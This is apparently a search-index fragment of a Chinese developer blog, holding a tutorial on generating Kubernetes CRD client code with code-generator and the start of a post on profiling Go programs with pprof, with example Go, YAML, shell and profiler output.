","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:1:1","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"控制自动生成代码标记-Tags 虽然代码生成器的某些行为是通过上面描述的命令行标志(特别是要处理的包)来控制的，但是更多的属性是通过您的golang文件中的tag标记来控制的。 有2种类型tag Global tags above package in doc.go Local tags above a type that is processed 通常，标记的形状为//+标记名称或//+标记名称=值，也就是说，它们被写入注释中。根据标签的不同，注释的位置可能很重要。有许多标记必须位于类型(或全局标记的包行)上方的注释中，其他标记必须与类型(Pr包行)分隔，中间至少有一行空行。最好遵循一个例子，并复制基本的形状。 全局标记-GLOBAL TAGS 全局标记在pkg/apis///doc.go中定义，如下 pkg/apis/example.com/v1/doc.go // +k8s:deepcopy-gen=package,register // Package v1 is the v1 version of the API. // +groupName=example.com package v1 默认情况下，它告诉DeepCopy-gen为该包中的每一种类型创建深度复制方法。如果您的类型不是必需的或不需要的，则可以使用本地标记//+k8s选择退出这样的类型：// +k8s:deepcopy-gen=false。如果不启用包范围的深度复制，则必须选择通过//+k8s对每种所需类型进行深度复制：// +k8s:deepcopy-gen=true。 最后，//+groupName=example.com定义了完全限定的API组名。如果搞错了，客户端会产生错误的代码。请注意，此标记必须位于包上方的注释块中。 ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:1:2","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"本地标记-LOCAL TAGS 本地标记可以直接写在API type上，也可以写在它上面的第二个注释块中。下面是一个示例 types.go。 // +genclient // +genclient:noStatus // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object // Database describes a database. type Database struct { metav1.TypeMeta `json:\",inline\"` metav1.ObjectMeta `json:\"metadata,omitempty\"` Spec DatabaseSpec `json:\"spec\"` } // DatabaseSpec is the spec for a Foo resource type DatabaseSpec struct { User string `json:\"user\"` Password string `json:\"password\"` Encoding string `json:\"encoding,omitempty\"` } // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object // DatabaseList is a list of Database resources type DatabaseList struct { metav1.TypeMeta `json:\",inline\"` metav1.ListMeta `json:\"metadata\"` Items []Database `json:\"items\"` } 注意，默认情况下，我们已为所有类型启用了deepcopy ，也可有选择退出。不过，这些类型都是API类型，需要deepcopy。因此，我们不必在本例 types.go中打开或关闭deepcopy，而只需在doc.go中的包范围内打开或关闭deepcopy。 ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:1:3","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"runtime.Object and DeepCopyObject 有一个特殊的deepcopy tag说明 // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object 需要为type添加这个tag 原因如下： k8s.op/apimachinery of the master branch—you have hit the compiler error that the CustomResource type does not implement runtime.Object because DeepCopyObject() runtime.Object is not defined on your type 解决方法：只需将以下本地标记置于顶级api类型之上 // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object In our example above both Database and DatabaseList are top-level types because they are used as runtime.Objects. As a rule of thumb, top-level types are those which have metav1.TypeMeta embedded. Also, those are the types which clients are create for using client-gen. Note, that the // +k8s:deepcopy-gen:interfaces tag can and should also be used in cases where you define API types that have fields of some interface type, for example, field SomeInterface. Then // +k8s:deepcopy-gen:interfaces=example.com/pkg/apis/example.SomeInterface will lead to the generation of a DeepCopySomeInterface() SomeInterface method. This allows it to deepcopy those fields in a type-correct way. ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:1:4","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"Client-gen Tags 最后，有许多标记可以控制client-gen，我们在我们的示例中看到了其中的两个标记。 // +genclient// +genclient:noStatus 第一个标记告诉Client-gen为该类型创建一个client(这始终是选择加入)。注意，不必也不应该将其置于API对象的列表类型之上。 // +genclient:nonNamespaced// +genclient:noVerbs// +genclient:onlyVerbs=create,delete// +genclient:skipVerbs=get,list,create,update,patch,delete,deleteCollection,watch// +genclient:method=Create,verb=create,result=k8s.io/apimachinery/pkg/apis/meta/v1.Status ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:1:5","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"程序使用client调用crd接口 使用client类型的main函数 A Main Function Using the Types Clients main.go import ( ... metav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\" \"k8s.io/client-go/tools/clientcmd\" examplecomclientset \"github.com/openshift-evangelist/crd-code-generation/pkg/client/clientset/versioned\" ) var ( kuberconfig = flag.String(\"kubeconfig\", \"\", \"Path to a kubeconfig. Only required if out-of-cluster.\") master = flag.String(\"master\", \"\", \"The address of the Kubernetes API server. Overrides any value in kubeconfig. Only required if out-of-cluster.\") ) func main() { flag.Parse() cfg, err := clientcmd.BuildConfigFromFlags(*master, *kuberconfig) if err != nil { glog.Fatalf(\"Error building kubeconfig: %v\", err) } exampleClient, err := examplecomclientset.NewForConfig(cfg) if err != nil { glog.Fatalf(\"Error building example clientset: %v\", err) } list, err := exampleClient.ExampleV1().Databases(\"default\").List(metav1.ListOptions{}) if err != nil { glog.Fatalf(\"Error listing all databases: %v\", err) } for _, db := range list.Items { fmt.Printf(\"database %s with user %q\\n\", db.Name, db.Spec.User) } } ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:1:6","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"tpye.go 实例 pkg/apis/example.com/v1/types.go 注意标记注释于type定义块之间的空行 package v1 import ( metav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\" ) // NodeCacheStatus represents the status of NodeCche. type NodeCacheStatus struct { // The number of 'Unknonw' NodeCache in this Node. Unknown int32 `json:\"unknown,omitempty\" protobuf:\"bytes,1,opt,name=unknown\"` // The number of 'Pending' NodeCache in this queue. Pending int32 `json:\"pending,omitempty\" protobuf:\"bytes,2,opt,name=pending\"` // The number of 'Running' NodeCache in this queue. Running int32 `json:\"running,omitempty\" protobuf:\"bytes,3,opt,name=running\"` } // +genclient // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object type NodeCache struct { metav1.TypeMeta `json:\",inline\"` metav1.ObjectMeta `json:\"metadata,omitempty\" protobuf:\"bytes,1,opt,name=metadata\"` Spec NodeCacheSpec `json:\"spec,omitempty\" protobuf:\"bytes,2,opt,name=spec\"` // The status of NCDataSet. // +optional Status NodeCacheStatus `json:\"status,omitempty\" protobuf:\"bytes,3,opt,name=status\"` } type NodeCacheSpec struct { // dataset list //Datasets []DataSetSummary `json:\"datasets,omitempty\" protobuf:\"bytes,1,opt,name=datasets\"` Datasets string `json:\"datasets,omitempty\" protobuf:\"bytes,1,opt,name=datasets\"` // Disk size unit :GB FreeSize int64 `json:\"freesize,omitempty\" protobuf:\"bytes,2,opt,name=freesize\"` // Disk size unit :GB AllocatableSize int64 `json:\"allocatablesize,omitempty\" protobuf:\"bytes,2,opt,name=allocatablesize\"` } //// +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object // //type DataSetSummary struct { // Digest string `json:\"digest,omitempty\" protobuf:\"bytes,1,opt,name=digest\"` // Size int64 `json:\"size,omitempty\" protobuf:\"bytes,2,opt,name=size\"` // InUse bool `json:\"inuse,omitempty\" protobuf:\"bytes,3,opt,name=inuse\"` //} // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object // NodeCacheList is a collection of NodeCache. type NodeCacheList struct { metav1.TypeMeta `json:\",inline\"` // Standard list metadata // More info: https://git.k8s.io/community/contributors/devel/api-conventions.md#metadata // +optional metav1.ListMeta `json:\"metadata,omitempty\" protobuf:\"bytes,1,opt,name=metadata\"` // items is the list of NCDataSet Items []NodeCache `json:\"items\" protobuf:\"bytes,2,rep,name=items\"` } ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:1:7","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"CRD开发步骤 ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:2:0","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"1. 编写CRD YAML apiVersion:apiextensions.k8s.io/v1beta1kind:CustomResourceDefinitionmetadata:name:nodecaches.example.comspec:group:example.comnames:kind:NodeCachelistKind:NodeCacheListplural:nodecachesscope:Clusterversion:v1validation:openAPIV3Schema:properties:apiVersion:type:stringkind:type:stringmetadata:type:objectspec:properties:datasets:type:stringfreesize:format:int64type:integerallocatablesize:format:int64type:integertype:objectstatus:properties:unknown:format:int32type:integerpending:format:int32type:integerrunning:format:int32type:integertype:objecttype:object ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:2:1","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"2. 创建项目目录 按照pkg/apis/$GROUP/$VERSION/形式创建项目目录，需要在该目录下编写crd相关的几个go文件 doc.go register.go types.go pkg/apis/example.com/v1/cd $GOPATH/src/github.com/goprojects/demo/pkg/apis.├── apis│ └── example.com│ └── v1│ ├── doc.go│ ├── register.go│ ├── types.go ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:2:2","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"3. 编写doc.go 位置：pkg/apis/$GROUP/$VERSION/doc.go // +k8s:deepcopy-gen=package,register // Package v1beta1 is the v1beta1 version of the API. // +groupName=example.com package v1beta1 ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:2:3","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"4. 编写types.go 位置：pkg/apis/$GROUP/$VERSION/types.go package v1beta1 import ( metav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\" ) // NodeStatStatus represents the status of NodeCche. type NodeStatStatus struct { // The number of 'Unknonw' NodeStat in this Node. Unknown int32 `json:\"unknown,omitempty\" protobuf:\"bytes,1,opt,name=unknown\"` // The number of 'Pending' NodeStat in this queue. Pending int32 `json:\"pending,omitempty\" protobuf:\"bytes,2,opt,name=pending\"` // The number of 'Running' NodeStat in this queue. Running int32 `json:\"running,omitempty\" protobuf:\"bytes,3,opt,name=running\"` } // +genclient // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object type NodeStat struct { metav1.TypeMeta `json:\",inline\"` metav1.ObjectMeta `json:\"metadata,omitempty\" protobuf:\"bytes,1,opt,name=metadata\"` Spec NodeStatSpec `json:\"spec,omitempty\" protobuf:\"bytes,2,opt,name=spec\"` // The status of NodeStat. // +optional Status NodeStatStatus `json:\"status,omitempty\" protobuf:\"bytes,3,opt,name=status\"` } // ... // more code define // ... ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:2:4","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"5. 编写register.go 位置：pkg/apis/$GROUP/$VERSION/register.go package v1beta1 import ( metav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\" \"k8s.io/apimachinery/pkg/runtime\" \"k8s.io/apimachinery/pkg/runtime/schema\" ) const ( // GroupName is the group name used in this package. GroupName = \"example.com\" // GroupVersion is the version of scheduling group GroupVersion = \"v1beta1\" ) // SchemeGroupVersion is group version used to register these objects var SchemeGroupVersion = schema.GroupVersion{Group: GroupName, Version: GroupVersion} // Resource takes an unqualified resource and returns a Group qualified GroupResource func Resource(resource string) schema.GroupResource { return SchemeGroupVersion.WithResource(resource).GroupResource() } var ( // localSchemeBuilder and AddToScheme will stay in k8s.io/kubernetes. SchemeBuilder runtime.SchemeBuilder localSchemeBuilder = \u0026SchemeBuilder AddToScheme = localSchemeBuilder.AddToScheme ) func init() { // We only register manually written functions here. The registration of the // generated functions takes place in the generated files. The separation // makes the code compile even when the generated files are missing. localSchemeBuilder.Register(addKnownTypes) } // Adds the list of known types to api.Scheme. func addKnownTypes(scheme *runtime.Scheme) error { scheme.AddKnownTypes(SchemeGroupVersion, \u0026NodeStat{}, \u0026NodeStatList{}, ) metav1.AddToGroupVersion(scheme, SchemeGroupVersion) return nil } ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:2:5","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"6. 执行 code-generator自动生成代码 安装 # set custom gopath GOPATH=/home/test/go_projects/crddemo go get k8s.io/code-generator go get k8s.io/apimachinery 执行shell脚本生成指定代码内容 cd $GOPATH/src/k8s.io/code-generator ./generate-groups.sh all \\ \"github.com/bingerambo/demo/pkg/client\" \\ \"github.com/bingerambo/demo/pkg/apis\" \\ foo:v1 demo脚本 crd-code-gen # cd /home/wangb/go_projects/crddemo/src/github.com/bingerambo/crd-code-generation/hack \u0026\u0026 ll total 12 -rwxr-x---. 1 root root 565 Oct 5 2020 custom-boilerplate.go.txt -rwxr-x---. 1 root root 543 Oct 5 2020 update-codegen.sh -rwxr-x---. 1 root root 693 Feb 28 2018 verify-codegen.sh # cd home/wangb/go_projects/crddemo/src/github.com/bingerambo/crd-code-generation/hack cat update-codegen.sh #!/bin/bash set -o errexit set -o nounset set -o pipefail GOPATH=\"/home/wangb/go_projects/crddemo\" SCRIPT_ROOT=$(dirname ${BASH_SOURCE})/.. CODEGEN_PKG=${CODEGEN_PKG:-$(cd ${SCRIPT_ROOT}; ls -d -1 ./vendor/k8s.io/code-generator 2\u003e/dev/null || echo ${GOPATH}/src/k8s.io/code-generator)} vendor/k8s.io/code-generator/generate-groups.sh all \\ github.com/bingerambo/crd-code-generation/pkg/nodecache_client github.com/bingerambo/crd-code-generation/pkg/apis \\ example.com:v1 \\ --go-header-file ${SCRIPT_ROOT}/hack/custom-boilerplate.go.txt ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:2:6","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"7. 实例 nodestat-crd.yaml ```yamlapiVersion:apiextensions.k8s.io/v1beta1kind:CustomResourceDefinitionmetadata:name:nodestats.example.comspec:group:example.comnames:kind:NodeStatlistKind:NodeStatListplural:nodestatsscope:Clusterversion:v1beta1validation:openAPIV3Schema:properties:apiVersion:type:stringkind:type:stringmetadata:type:objectspec:type:objectproperties:nodename:type:string# 利用率utility:type:objectproperties:name:type:stringsumarry:type:stringaverage:format:floattype:number devs:type:arrayitems:type:objectproperties:id:type:stringdata:format:floattype:number# 总量total:type:objectproperties:name:type:stringsumarry:type:stringaverage:format:floattype:number devs:type:arrayitems:type:objectproperties:id:type:stringdata:format:floattype:numberstatus:properties:unknown:format:int32type:integerpending:format:int32type:integerrunning:format:int32type:integertype:objecttype:object #### 示例脚本nodestat-update-codegen.sh github.com/kubernetes-sigs/kube-batch/hack cat nodestat-update-codegen.sh ```shell #!/bin/bash # Copyright 2019 The Kube-batch Authors. # # Licensed under the Apache License, Version 2.0 (the \"License\"); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \"AS IS\" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. set -o errexit set -o nounset set -o pipefail SCRIPT_ROOT=$(dirname ${BASH_SOURCE})/.. CODEGEN_PKG=${SCRIPT_ROOT}/vendor/k8s.io/code-generator # generate the code with: # --output-base because this script should also be able to run inside the vendor dir of # k8s.io/kubernetes. The output-base is needed for the generators to output into the vendor dir # instead of the $GOPATH directly. For normal projects this can be dropped. cd ${SCRIPT_ROOT} bash ${CODEGEN_PKG}/generate-groups.sh \"deepcopy,client,informer,lister\" \\ github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client github.com/kubernetes-sigs/kube-batch/pkg/apis \\ \"example.com:v1beta1\" \\ --go-header-file ${SCRIPT_ROOT}/hack/custom-boilerplate.go.txt # To use your own boilerplate text use: # --go-header-file ${SCRIPT_ROOT}/hack/custom-boilerplate.go.txt codegen代码自动生成命令 例子：kube-batch 执行命令代码生成 GOPATH=\"project gopath\" ${GOPATH}/src/github.com/kubernetes-sigs/kube-batch/hack/nodestat-update-codegen.sh github.com/kubernetes-sigs/kube-batch]# /home/wangb/go_projects/kubebatch/src/github.com/kubernetes-sigs/kube-batch/hack/nodestat-update-codegen.shGenerating deepcopy funcsGenerating clientset for example.com:v1beta1 at github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client/clientsetGenerating listers for example.com:v1beta1 at github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client/listersGenerating informers for example.com:v1beta1 at github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client/informers ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:2:7","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"问题 使用自动生成后的代码，操作自定义CRD时，会报错，如下 E0420 11:40:15.739772 8308 streamwatcher.go:109] Unable to decode an event from the watch stream: unable to decode watch event: no kind \"NodeStat\" is registered for version \"example.com/v1beta1\" in scheme \"github.com/kubernetes-sigs/kube-batch/pkg/nodecache_client/clientset/versioned/scheme/register.go:30\" E0420 11:40:15.851896 8308 streamwatcher.go:109] Unable to decode an event from the watch stream: unable to decode watch event: no kind \"NodeStat\" is registered for version \"example.com/v1beta1\" in scheme \"github.com/kubernetes-sigs/kube-batch/pkg/nodecache_client/clientset/versioned/scheme/register.go:30\" 手动修改生成代码解决，自定义serializer.DirectCodecFactory nodestat_client/clientset/versioned/typed/example.com/v1beta1/example.com_client.go package v1beta1 import ( v1beta1 \"github.com/kubernetes-sigs/kube-batch/pkg/apis/example.com/v1beta1\" \"github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client/clientset/versioned/scheme\" \"k8s.io/apimachinery/pkg/runtime/serializer\" rest \"k8s.io/client-go/rest\" ) func setConfigDefaults(config *rest.Config) error { gv := v1beta1.SchemeGroupVersion config.GroupVersion = \u0026gv config.APIPath = \"/apis\" // modify by binge //config.NegotiatedSerializer = scheme.Codecs.WithoutConversion() config.NegotiatedSerializer = serializer.DirectCodecFactory{ CodecFactory: scheme.Codecs, } if config.UserAgent == \"\" { config.UserAgent = rest.DefaultKubernetesUserAgent() } return nil } ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:3:0","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"参考资料 使用 CustomResourceDefinition 扩展 Kubernetes API 如何配置使用kubernets code-generator how-to-generate-client-codes-for-kubernetes-custom-resource-definitions-crd ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:4:0","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["Go"],"content":"Golang作为一门高效的语言，性能监控和调试非常重要，如何进行性能监控和分析是优化的关键。 Go语言项目中的性能优化主要有以下几个方面： CPU profile：报告程序的 CPU 使用情况，按照一定频率去采集应用程序在 CPU 和寄存器上面的数据 Memory Profile（Heap Profile）：报告程序的内存使用情况 Block Profiling：报告 goroutines 不在运行状态的情况，可以用来分析和查找死锁等性能瓶颈 Goroutine Profiling：报告 goroutines 的使用情况，有哪些 goroutine，它们的调用关系是怎样的 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:0:0","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"pprof介绍 go程序从开始运行起，runtime就按照一定频率对内存分配进行采样记录：当内存分配每达到一定值（默认是512KB，由runtime.MemProfileRate设定）, runtime就会记录下当前这次内存分配的大小，call stack等信息到profile里面。 而CPU的profile是从调用runtime/pprof包的pprof.StartCPUProfile()开始，到pprof.StopCPUProfile()结束，每1秒采样100次，每次采样时记录下当前正在执行的所有goroutine的call stack，某个函数在这些快照里面出现的次数越多就说明这个函数越耗时。 运行的go程序的所有profile信息都是通过在运行时调用runtime/pprof和runtime/trace两个包的接口获取，调用这些接口的方式有直接调用和通过http请求间接调用两种，下面我们说明各种常用的profile信息以及它们的获取，使用方式。 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:1:0","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"pprof配置 pprof采集方式有2种： 命令模式 监控模式 pprof开启后，每隔一段时间（10ms）就会收集下当前的堆栈信息，获取格格函数占用的CPU以及内存资源；最后通过对这些采样数据进行分析，形成一个性能分析报告。 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:2:0","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"引入包 import \"runtime/pprof\" ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:2:1","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"使用方法 pprof.StartCPUProfile(w io.Writer) //开启，向一个io中写入cpu信息 pprof.WriteHeapProfile(w io.Writer) //向一个io中写入内存信息 pprof.StopCPUProfile() //停止，写入完成 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:2:2","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"命令模式 将数据写入到文件中 通过 go tool pprof [文件名] 命令查看使用 我们可以在交互界面输入top 10 来查看程序中占用CPU前10位的函数： 命令： top 10 [root@node61 ~]# go tool pprof http://10.151.11.61:39999/debug/pprof/profile?seconds=30Fetching profile over HTTP from http://10.151.11.61:39999/debug/pprof/profile?seconds=30Saved profile in /root/pprof/pprof.kube-batch.samples.cpu.018.pb.gzFile:kube-batchBuild ID:3224bdfdc94dfee3f4c2f15d26825527ae27817cType:cpuTime:Apr 5, 2021 at 11:48am (CST)Duration:30s, Total samples = 290ms ( 0.97%)Entering interactive mode (type \"help\" for commands, \"o\" for options)(pprof) top 10Showing nodes accounting for 200ms, 68.97% of 290ms totalShowing top 10 nodes out of 106flat flat% sum% cum cum%40ms 13.79% 13.79% 40ms 13.79% runtime.usleep30ms 10.34% 24.14% 30ms 10.34% encoding/json.stateInString20ms 6.90% 31.03% 70ms 24.14% regexp.(*Regexp).tryBacktrack20ms 6.90% 37.93% 20ms 6.90% regexp/syntax.(*Inst).MatchRunePos20ms 6.90% 44.83% 20ms 6.90% runtime.epollwait20ms 6.90% 51.72% 60ms 20.69% runtime.mallocgc20ms 6.90% 58.62% 20ms 6.90% runtime.memclrNoHeapPointers10ms 3.45% 62.07% 30ms 10.34% encoding/json.(*Decoder).readValue10ms 3.45% 65.52% 10ms 3.45% encoding/json.stateEndValue10ms 3.45% 68.97% 10ms 3.45% github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString(pprof) 其中： flat：当前函数占用CPU的耗时 flat%：当前函数占用CPU的耗时百分比 sum%：函数占用CPU的耗时累计百分比 cum：当前函数加上调用当前函数的函数占用CPU的总耗时 cum%：当前函数加上调用当前函数的函数占用CPU的总耗时百分比 最后一列：函数名称 也可以通过list 函数名查看函数的信息 命令： list func_name (pprof) list ReadStringTotal:290msROUTINE ======================== github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString in /home/wangb/projects/src/github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go/iter_str.go10ms 10ms (flat, cum) 3.45% of Total. . 10:c := iter.nextToken(). . 11:if c == '\"' {. . 12:for i := iter.head; i \u003c iter.tail; i++ {. . 13:c := iter.buf[i]. . 14:if c == '\"' {10ms 10ms 15:ret = string(iter.buf[iter.head:i]). . 16:iter.head = i + 1. . 17:return ret. . 18:}else if c == '\\\\' {. . 19:break. . 20:}else if c \u003c ' ' {(pprof) tree查看调用链 (pprof) topShowing nodes accounting for 200ms, 68.97% of 290ms totalShowing top 10 nodes out of 106flat flat% sum% cum cum%40ms 13.79% 13.79% 40ms 13.79% runtime.usleep30ms 10.34% 24.14% 30ms 10.34% encoding/json.stateInString20ms 6.90% 31.03% 70ms 24.14% regexp.(*Regexp).tryBacktrack20ms 6.90% 37.93% 20ms 6.90% regexp/syntax.(*Inst).MatchRunePos20ms 6.90% 44.83% 20ms 6.90% runtime.epollwait20ms 6.90% 51.72% 60ms 20.69% runtime.mallocgc20ms 6.90% 58.62% 20ms 6.90% runtime.memclrNoHeapPointers10ms 3.45% 62.07% 30ms 10.34% encoding/json.(*Decoder).readValue10ms 3.45% 65.52% 10ms 3.45% encoding/json.stateEndValue10ms 3.45% 68.97% 10ms 3.45% github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString(pprof) tree ReadStringActive filters:focus=ReadStringShowing nodes accounting for 10ms, 3.45% of 290ms total----------------------------------------------------------+-------------flat flat% sum% cum cum% calls calls% + context----------------------------------------------------------+-------------10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadObjectCB10ms 3.45% 3.45% 10ms 3.45% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString----------------------------------------------------------+-------------10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).skipObject00% 3.45% 10ms 3.45% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadObjectCB10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).skipObject.func1----------------------------------------------------------+-------------10ms 100% | 